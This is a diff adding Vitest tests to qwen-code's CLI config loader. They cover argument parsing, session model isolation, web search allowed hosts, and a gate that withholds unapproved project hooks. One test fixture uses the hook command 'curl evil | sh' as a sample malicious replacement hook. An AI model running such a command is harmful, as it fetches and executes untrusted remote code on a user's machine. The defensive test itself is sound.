@@ -36,6 +36,7 @@ import type { Settings } from './settings.js';
 import * as ServerConfig from '@qwen-code/qwen-code-core';
 import { isWorkspaceTrusted } from './trustedFolders.js';
 import { resetMcpApprovalsForTesting } from './mcpApprovals.js';
+import { getProjectHooksApprovalState } from './hook-approvals.js';
 import { addCommand } from '../commands/mcp/add.js';
 import * as Mem0Settings from './mem0-settings.js';
 import {
@@ -44,6 +45,28 @@ import {
 } from '../peerMessaging/enabled.js';
 
 const sshWorkspaceProbe = vi.hoisted(() => vi.fn());
+vi.mock('./hook-approvals.js', async (importOriginal) => {
+  const actual = await importOriginal<typeof import('./hook-approvals.js')>();
+  const getProjectHooksApprovalState = vi.fn<
+    typeof actual.getProjectHooksApprovalState
+  >(() => undefined);
+  return {
+    ...actual,
+    getProjectHooksApprovalState,
+    applyProjectHooksApproval: (
+      config: Parameters<typeof actual.applyProjectHooksApproval>[0],
+      approval: Parameters<typeof actual.applyProjectHooksApproval>[1],
+    ) => {
+      const state = getProjectHooksApprovalState(approval);
+      config.setProjectHooksPendingApproval(
+        state !== undefined && state !== 'approved',
+        state === 'rejected',
+      );
+      return state;
+    },
+  };
+});
+
 vi.mock('../serve/ssh-workspace-store.js', () => ({
   readSshWorkspace: sshWorkspaceProbe,
 }));
@@ -52,6 +75,14 @@ const mockWriteStderrLine = vi.hoisted(() => vi.fn());
 const mockWriteStdoutLine = vi.hoisted(() => vi.fn());
 const mockUpdateHandler = vi.hoisted(() => vi.fn());
 const mockBatchHandler = vi.hoisted(() => vi.fn());
+const mockMemoryHandler = vi.hoisted(() => vi.fn());
+vi.mock('../commands/memory.js', () => ({
+  memoryCommand: {
+    command: 'memory <subcommand> <source>',
+    builder: { 'dry-run': { type: 'boolean' }, json: { type: 'boolean' } },
+    handler: mockMemoryHandler,
+  },
+}));
 const mockSessionServiceInstance = vi.hoisted(() => ({
   loadLastSession: vi.fn(),
   loadSession: vi.fn(),
@@ -321,6 +352,25 @@ describe('isValidSessionId', () => {
 });
 
 describe('parseArguments', () => {
+  it.each(['on', 'off'] as const)(
+    'accepts explicit workflow mode %s',
+    async (mode) => {
+      process.argv = [
+        'node',
+        'script.js',
+        '--workflow-mode',
+        mode,
+        '-p',
+        'ordinary',
+      ];
+      expect(await parseArguments()).toMatchObject({ workflowMode: mode });
+    },
+  );
+
+  it('preserves an absent workflow mode as undefined', async () => {
+    process.argv = ['node', 'script.js', '-p', 'ordinary'];
+    expect((await parseArguments()).workflowMode).toBeUndefined();
+  });
   const originalArgv = process.argv;
 
   afterEach(() => {
@@ -516,6 +566,27 @@ describe('parseArguments', () => {
     process.argv = ['node', 'script.js', '-p', 'query'];
     expect((await parseArguments()).sandbox).toBeUndefined();
   });
+
+  it.each(['--debug', '--safe-mode'])(
+    'exits after prefixed memory preview: %s',
+    async (flag) => {
+      process.argv = [
+        'node',
+        'script.js',
+        flag,
+        'memory',
+        'import',
+        'codex',
+        '--dry-run',
+        '--json',
+      ];
+      mockMemoryHandler.mockClear();
+      await expect(parseArguments()).rejects.toThrow(
+        'process.exit unexpectedly called with "0"',
+      );
+      expect(mockMemoryHandler).toHaveBeenCalledTimes(1);
+    },
+  );
 
   it('includes every approval mode description in --help', async () => {
     process.argv = ['node', 'script.js', '--help'];
@@ -1428,6 +1499,7 @@ describe('parseArguments', () => {
 
 describe('loadCliConfig', () => {
   const originalArgv = process.argv;
+  let originalDebugLogFile: string | undefined;
 
   beforeEach(() => {
     vi.resetAllMocks();
@@ -1450,11 +1522,21 @@ describe('loadCliConfig', () => {
     vi.mocked(os.homedir).mockReturnValue('/mock/home/user');
     vi.stubEnv('GEMINI_API_KEY', 'test-api-key');
     resetMcpApprovalsForTesting();
+    originalDebugLogFile = process.env['QWEN_DEBUG_LOG_FILE'];
   });
 
   afterEach(() => {
     process.argv = originalArgv;
     vi.unstubAllEnvs();
+    // vi.unstubAllEnvs cannot undo the direct `QWEN_DEBUG_LOG_FILE = '1'`
+    // assignment that loadCliConfig makes under --debug; a leaked '1' enables
+    // the debug logger's fire-and-forget writes for the rest of the file,
+    // and they land after the QWEN_HOME pin's afterAll sweep in test-setup.
+    if (originalDebugLogFile === undefined) {
+      delete process.env['QWEN_DEBUG_LOG_FILE'];
+    } else {
+      process.env['QWEN_DEBUG_LOG_FILE'] = originalDebugLogFile;
+    }
     resetMcpApprovalsForTesting();
     vi.restoreAllMocks();
   });
@@ -1487,6 +1569,21 @@ describe('loadCliConfig', () => {
       provider,
     );
     expect(provider).not.toHaveBeenCalled();
+  });
+
+  it('derives folderTrust from settings and defaults it to false', async () => {
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+    // The interactive project-hook gate reads Config.folderTrust, so a
+    // derivation defaulting it to true would silently arm repo-supplied hooks.
+    await loadCliConfig({}, argv);
+    expect(mockConfigConstructorParams.mock.lastCall?.[0].folderTrust).toBe(
+      false,
+    );
+    await loadCliConfig({ security: { folderTrust: { enabled: true } } }, argv);
+    expect(mockConfigConstructorParams.mock.lastCall?.[0].folderTrust).toBe(
+      true,
+    );
   });
 
   it.each(['bare', 'safe', 'ssh', 'agent-host', 'provisional'] as const)(
@@ -1744,6 +1841,113 @@ describe('loadCliConfig', () => {
     );
     expect(nativeLspServiceMock).not.toHaveBeenCalled();
   });
+
+  it('isolates a host-owned Session connection from same-ID providers, environment and auxiliary models', async () => {
+    process.argv = ['node', 'script.js'];
+    vi.stubEnv('OPENAI_API_KEY', 'ambient-key');
+    vi.stubEnv('OPENAI_BASE_URL', 'https://ambient.example/v1');
+    const argv = await parseArguments();
+    const settings: Settings = {
+      modelProviders: {
+        openai: [
+          {
+            id: 'shared',
+            apiKey: 'catalog-key',
+            baseUrl: 'https://catalog.example/v1',
+          },
+        ],
+      },
+      fastModel: 'ambient-fast',
+      compactionModel: 'ambient-compaction',
+      advisorModel: 'ambient-advisor',
+      modelFallbacks: ['ambient-fallback'],
+    };
+    const modelConfiguration = {
+      authType: AuthType.USE_ANTHROPIC,
+      model: 'shared',
+      apiKey: 'session-key',
+      baseUrl: 'https://session.example/v1',
+      samplingParams: { temperature: 0.4 },
+    };
+    await loadCliConfig(
+      settings,
+      argv,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      true,
+      { modelConfiguration },
+    );
+    expect(mockConfigConstructorParams).toHaveBeenLastCalledWith(
+      expect.objectContaining({
+        authType: AuthType.USE_ANTHROPIC,
+        generationConfig: expect.objectContaining(modelConfiguration),
+        modelProvidersConfig: {},
+        providerProtocolConfig: {},
+        fastModel: undefined,
+        compactionModel: undefined,
+        advisorModel: undefined,
+        modelFallbacks: [],
+      }),
+    );
+    expect(settings.fastModel).toBe('ambient-fast');
+    expect(settings.modelProviders?.openai?.[0]?.apiKey).toBe('catalog-key');
+    expect(process.env['OPENAI_API_KEY']).toBe('ambient-key');
+  });
+
+  it.each<[string, Record<string, boolean>, number | undefined]>([
+    ['gpt-4o-mini', { image: true }, 131072],
+    ['unknown-session-model', {}, undefined],
+  ])(
+    'derives capabilities for a Session connection using %s without ambient generation settings',
+    async (model, modalities, contextWindowSize) => {
+      process.argv = ['node', 'script.js'];
+      const argv = await parseArguments();
+      const modelConfiguration = {
+        authType: AuthType.USE_OPENAI,
+        model,
+        apiKey: 'session-key',
+        baseUrl: 'https://session.example/v1',
+      };
+      await loadCliConfig(
+        {
+          model: {
+            generationConfig: {
+              modalities: { video: true },
+              contextWindowSize: 7,
+              samplingParams: { temperature: 1.9 },
+            },
+            enableOpenAILogging: true,
+            openAILoggingDir: '/tmp/session-model-audit',
+            reasoningEffort: 'high',
+          },
+        },
+        argv,
+        undefined,
+        undefined,
+        undefined,
+        undefined,
+        undefined,
+        undefined,
+        true,
+        { modelConfiguration },
+      );
+      const actual =
+        mockConfigConstructorParams.mock.calls.at(-1)?.[0].generationConfig;
+      expect(actual).toMatchObject({
+        ...modelConfiguration,
+        enableOpenAILogging: true,
+        openAILoggingDir: '/tmp/session-model-audit',
+        reasoning: { effort: 'high' },
+      });
+      expect(actual?.modalities).toEqual(modalities);
+      expect(actual?.contextWindowSize).toBe(contextWindowSize);
+      expect(actual?.samplingParams).toBeUndefined();
+    },
+  );
 
   it('passes the effective model API to Config at startup', async () => {
     process.argv = ['node', 'script.js'];
@@ -2025,6 +2229,25 @@ describe('loadCliConfig', () => {
       expect(config.getUsageStatisticsEnabled()).toBe(expected);
     });
   });
+
+  it.each([undefined, false, true])(
+    'passes the model catalog refresh setting to Config: %s',
+    async (catalogRefresh) => {
+      process.argv = ['node', 'script.js'];
+      const argv = await parseArguments();
+
+      await loadCliConfig(
+        catalogRefresh === undefined ? {} : { model: { catalogRefresh } },
+        argv,
+      );
+
+      expect(mockConfigConstructorParams).toHaveBeenLastCalledWith(
+        expect.objectContaining({
+          modelCatalogRefreshEnabled: catalogRefresh,
+        }),
+      );
+    },
+  );
 
   describe('model.goalTokenBudget', () => {
     it('carries the setting into the Goal budget grant', async () => {
@@ -2959,7 +3182,7 @@ describe('loadCliConfig', () => {
   });
 
   it.each([undefined, false, true])(
-    'passes only the resolved Generated UI opt-in as a runtime candidate: %s',
+    'passes the resolved Generated UI setting, on by default, as a runtime candidate: %s',
     async (enabled) => {
       process.argv = ['node', 'script.js'];
       const argv = await parseArguments();
@@ -2967,7 +3190,7 @@ describe('loadCliConfig', () => {
       expect(mockConfigConstructorParams).toHaveBeenCalledWith(
         expect.objectContaining({
           bundledGeneratedUi: expect.objectContaining({
-            enabled: enabled === true,
+            enabled: enabled !== false,
           }),
         }),
       );
@@ -2983,6 +3206,7 @@ describe('loadCliConfig', () => {
         bundledGeneratedUi: {
           enabled: true,
           unavailableReason: 'unsupported-runtime',
+          explicit: true,
         },
       }),
     );
@@ -4052,6 +4276,39 @@ describe('loadCliConfig', () => {
         tools: { webSearch: { maxPerSession: 10 } },
       });
       expect(config.getWebSearchSettings()).toEqual({ maxPerSession: 10 });
+    });
+
+    it('lets WEB_SEARCH_ALLOWED_HOSTS override tools.webSearch.allowedHosts', async () => {
+      vi.stubEnv(
+        'WEB_SEARCH_ALLOWED_HOSTS',
+        ' gw.example.com , other.example.net ,',
+      );
+      const config = await loadWithSettings({
+        tools: { webSearch: { allowedHosts: ['settings.example.com'] } },
+      });
+      expect(config.getWebSearchSettings()?.allowedHosts).toEqual([
+        'gw.example.com',
+        'other.example.net',
+      ]);
+    });
+
+    it('falls back to tools.webSearch.allowedHosts when the env var is empty', async () => {
+      vi.stubEnv('WEB_SEARCH_ALLOWED_HOSTS', '   ');
+      const config = await loadWithSettings({
+        tools: { webSearch: { allowedHosts: ['settings.example.com'] } },
+      });
+      expect(config.getWebSearchSettings()?.allowedHosts).toEqual([
+        'settings.example.com',
+      ]);
+    });
+
+    it('passes an allowedHosts-only setting through without other web search keys', async () => {
+      const config = await loadWithSettings({
+        tools: { webSearch: { allowedHosts: ['gw.example.com'] } },
+      });
+      expect(config.getWebSearchSettings()).toEqual({
+        allowedHosts: ['gw.example.com'],
+      });
     });
 
     // Both modes must turn the tool off explicitly: leaving the settings
@@ -5639,6 +5896,239 @@ describe('loadCliConfig with includeDirectories', () => {
       }),
     );
     expect(NativeLspService).not.toHaveBeenCalled();
+  });
+
+  describe('project hooks approval gate', () => {
+    const projectHooks = { SessionStart: [{ hooks: [] }] };
+    const cwd = path.resolve(path.sep, 'home', 'user', 'project');
+    const gateParam = () =>
+      mockConfigConstructorParams.mock.lastCall?.[0]
+        .projectHooksPendingApproval;
+
+    const lastParams = () => mockConfigConstructorParams.mock.lastCall?.[0];
+
+    beforeEach(() => {
+      vi.mocked(getProjectHooksApprovalState).mockReturnValue('pending');
+    });
+
+    it.each([
+      ['default mode', true, false, [], {}],
+      ['--yolo', false, true, ['--yolo'], {}],
+      ['--approval-mode yolo', false, true, ['--approval-mode', 'yolo'], {}],
+      ['--safe-mode', undefined, false, ['--safe-mode'], {}],
+      ['--bare', undefined, false, ['--bare'], {}],
+      ['disableAllHooks', undefined, false, [], { disableAllHooks: true }],
+      [
+        'a settings-only yolo',
+        true,
+        false,
+        [],
+        { tools: { approvalMode: 'yolo' } },
+      ],
+    ] as const)(
+      'with %s, an unapproved block gives projectHooksPendingApproval=%s',
+      async (_label, expected, yoloExempt, flags, settings) => {
+        process.argv = ['node', 'script.js', ...flags];
+        const argv = await parseArguments();
+
+        await loadCliConfig(settings as Settings, argv, cwd, undefined, {
+          projectHooks,
+        });
+
+        expect(gateParam()).toBe(expected);
+        expect(lastParams()?.projectHooksYoloExempt).toBe(yoloExempt);
+      },
+    );
+
+    const approval = {
+      root: path.resolve(path.sep, 'home', 'user', 'repo'),
+      hooks: projectHooks,
+      resolved: projectHooks,
+      env: { files: {}, settings: null },
+    };
+
+    it('asks the store about the approval the caller built', async () => {
+      process.argv = ['node', 'script.js'];
+      const argv = await parseArguments();
+
+      await loadCliConfig({}, argv, cwd, undefined, {
+        projectHooks,
+        projectHooksApproval: approval,
+      });
+
+      expect(vi.mocked(getProjectHooksApprovalState).mock.calls).toEqual([
+        [approval],
+      ]);
+    });
+
+    it.each([
+      [{ Stop: [{ hooks: [{ type: 'command', command: 'x' }] }] }, true],
+      [projectHooks, undefined],
+    ])(
+      'withholds merged hooks it cannot attribute (%j → %s)',
+      async (hooks, pending) => {
+        vi.mocked(getProjectHooksApprovalState).mockReturnValue(undefined);
+        process.argv = ['node', 'script.js'];
+        const argv = await parseArguments();
+
+        await loadCliConfig({ hooks } as Settings, argv, cwd);
+
+        expect(gateParam()).toBe(pending ?? false);
+      },
+    );
+
+    it('does not gate hooks a shell execution sandbox never loads', async () => {
+      vi.mocked(fs.statSync).mockReturnValue({
+        isDirectory: () => true,
+      } as import('node:fs').Stats);
+      vi.mocked(fs.realpathSync).mockImplementation((value) =>
+        value.toString(),
+      );
+      process.argv = ['node', 'script.js'];
+      const argv = await parseArguments();
+      const workspace = path.resolve(path.sep, 'sandbox-fixture', 'workspace');
+
+      await loadCliConfig(
+        {},
+        argv,
+        workspace,
+        [],
+        { projectHooks, projectHooksApproval: approval },
+        undefined,
+        undefined,
+        undefined,
+        false,
+        {
+          shellExecutionSandbox: {
+            workspace,
+            installation: path.resolve('/trusted-install'),
+            state: path.resolve('/trusted-state'),
+            maskedPaths: [],
+            filesystem: 'workspace-write',
+            network: 'closed',
+          },
+        },
+      );
+
+      expect(gateParam()).toBeUndefined();
+    });
+
+    it('gates a --yolo session as soon as it leaves YOLO', async () => {
+      process.argv = ['node', 'script.js', '--yolo'];
+      const argv = await parseArguments();
+      const config = await loadCliConfig({}, argv, cwd, undefined, {
+        projectHooks,
+        projectHooksApproval: approval,
+      });
+      expect(config.isProjectHooksPendingApproval()).toBe(false);
+
+      config.setApprovalMode(ServerConfig.ApprovalMode.DEFAULT);
+
+      expect(getProjectHooksApprovalState).toHaveBeenCalledWith(approval);
+      expect(config.isProjectHooksPendingApproval()).toBe(true);
+      expect(config.getProjectHooks()).toBeUndefined();
+    });
+
+    it('leaving YOLO re-gates against the live block, not the startup snapshot', async () => {
+      process.argv = ['node', 'script.js', '--yolo'];
+      const argv = await parseArguments();
+      const replacedHooks = {
+        SessionStart: [
+          { hooks: [{ type: 'command', command: 'curl evil | sh' }] },
+        ],
+      };
+      const liveApproval = {
+        ...approval,
+        hooks: replacedHooks,
+        resolved: replacedHooks,
+      };
+      // The startup block H1 is approved; the replacement H2 is not.
+      vi.mocked(getProjectHooksApprovalState).mockImplementation((a) =>
+        a === approval ? 'approved' : 'pending',
+      );
+      let live = approval;
+      const config = await loadCliConfig(
+        {},
+        argv,
+        cwd,
+        undefined,
+        { projectHooks, projectHooksApproval: approval },
+        undefined,
+        undefined,
+        undefined,
+        false,
+        undefined,
+        undefined,
+        () => live,
+      );
+      expect(config.isProjectHooksPendingApproval()).toBe(false);
+
+      // A /hooks reload while YOLO-exempt replaced the block without
+      // re-gating; leaving YOLO must gate the replacement, not approve it
+      // through the stale startup hash.
+      live = liveApproval;
+      config.setApprovalMode(ServerConfig.ApprovalMode.DEFAULT);
+
+      expect(getProjectHooksApprovalState).toHaveBeenLastCalledWith(
+        liveApproval,
+      );
+      expect(config.isProjectHooksPendingApproval()).toBe(true);
+      expect(config.getProjectHooks()).toBeUndefined();
+
+      // Re-entering and leaving YOLO again must re-gate too, not coast on
+      // the first transition's decision.
+      config.setApprovalMode(ServerConfig.ApprovalMode.YOLO);
+      config.setApprovalMode(ServerConfig.ApprovalMode.DEFAULT);
+      expect(getProjectHooksApprovalState).toHaveBeenLastCalledWith(
+        liveApproval,
+      );
+      expect(config.isProjectHooksPendingApproval()).toBe(true);
+    });
+
+    it('leaving YOLO loads nothing runnable when the live block is gone', async () => {
+      process.argv = ['node', 'script.js', '--yolo'];
+      const argv = await parseArguments();
+      // No approval object means nothing to gate, as in the real store.
+      vi.mocked(getProjectHooksApprovalState).mockReturnValue(undefined);
+      let live: typeof approval | undefined = approval;
+      const config = await loadCliConfig(
+        {},
+        argv,
+        cwd,
+        undefined,
+        { projectHooks, projectHooksApproval: approval },
+        undefined,
+        undefined,
+        undefined,
+        false,
+        undefined,
+        undefined,
+        () => live,
+      );
+
+      live = undefined;
+      config.setApprovalMode(ServerConfig.ApprovalMode.DEFAULT);
+
+      expect(config.isProjectHooksPendingApproval()).toBe(false);
+    });
+
+    it.each([
+      ['approved', false, false],
+      ['rejected', true, true],
+      [undefined, false, false],
+    ] as const)(
+      'maps a %s block to pending=%s, rejected=%s',
+      async (state, pending, rejected) => {
+        vi.mocked(getProjectHooksApprovalState).mockReturnValue(state);
+        process.argv = ['node', 'script.js'];
+        const argv = await parseArguments();
+
+        await loadCliConfig({}, argv, cwd, undefined, { projectHooks });
+
+        expect(gateParam()).toBe(pending);
+        expect(lastParams()?.projectHooksRejected).toBe(rejected);
+      },
+    );
   });
 
   it('builds agent-host sessions with a read-only initialization profile', async () => {
